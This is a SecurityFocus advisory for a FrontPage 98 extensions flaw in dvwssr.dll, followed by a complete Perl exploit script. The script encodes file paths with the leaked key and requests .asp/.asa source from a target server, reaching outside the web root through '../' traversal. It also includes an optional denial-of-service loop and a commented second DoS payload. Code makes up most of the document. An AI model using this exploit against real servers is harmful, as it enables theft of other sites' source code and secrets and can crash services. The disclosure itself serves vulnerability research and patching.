source: http://www.securityfocus.com/bid/1108/info

Two dlls (dvwssr.dll and mtd2lv.dll) included with the FrontPage 98 extensions for IIS and shipped as part of the NT Option Pack include an obfuscation string that manipulates the name of requested files. Knowing this string and the obfuscation algorithm allows anyone with web authoring privileges on the target host to download any .asp or .asa source on the system (including files outside the web root, through usage of the '../' string). This includes users with web authoring rights to only one of several virtual hosts on a system, allowing one company to potentially gain access to the source of another company's website if hosted on the same physical machine. 

#!/usr/bin/perl
# dvwssr.pl DEMONSTRATION by rain forest puppy
#
# rfp@wiretrip.net / www.wiretrip.net/rfp/
#
# usage:  ./dvwssr.pl <target host> <file to request>
#
# example:  ./dvwssr.pl localhost /default.asp

use Socket;

$ip=$ARGV[0];
$file=$ARGV[1];

print "Encoding to: ".encodefilename($file)."\n";

$DoS=0;  # change to 1 to run the denial of service code

if($DoS==0){ # regular request

$url="GET /_vti_bin/_vti_aut/dvwssr.dll?".encodefilename($file).
        " HTTP/1.0\n\n";
print sendraw($url);

} else {# denial of service - this is crud that I used to make it 
        # crash on accident.  The code was for testing something
        # else.  I provide it as-is so you can reproduce exactly
        # what I was doing.

 for($x=206;$x>0;$x--){
  $B='A'x $x;
  $file="/$B/..".$file; print "$x ";
  $url="GET /_vti_bin/_vti_aut/dvwssr.dll?".encodefilename($file).
        " HTTP/1.0\n\n";
  print sendraw($url);
 }

# another DoS in the script; uncomment if you're a DoS kiddie.

#  $B='A'x 10000;
#  $file="/$B/../die.asp";
#  $url="GET /_vti_bin/_vti_aut/dvwssr.dll?".encodefilename($file).
#       " HTTP/1.0\n\n";
#  print sendraw($url);

}

sub encodefilename {
my $from=shift;
my
$slide="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
my $key="Netscape engineers are weenies!";
my $kc=length($from)%31; # this was fixed to include the '%31'
my ($fv,$kv,$tmp,$to,$lett);
@letts=split(//,$from);
 foreach $lett (@letts){
  $fv=index $slide, $lett;
  $fv=index $slide, (substr $slide,62-$fv,1) if($fv>=0);
  $kv=index $slide, substr $key, $kc, 1;
  if($kv>=0 && $fv>=0){
   $tmp= $kv - $fv;
   if($tmp <0){$tmp +=62;}
   $to.=substr $slide, $tmp,1; } else {
   $to.=$lett;}
  if(++$kc >= length($key)){ $kc=0;}
 }return $to;}

sub sendraw {
        my ($pstr)=@_;
        my $target;
        $target= inet_aton($ip) || die("inet_aton problems");
        socket(S,2,1,getprotobyname('tcp')||0) || die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,80,$target)){
                select(S);              $|=1;
                print $pstr;            my @in=<S>;
                select(STDOUT);         close(S);
                return @in;
        } else { die("Can't connect...\n"); }}



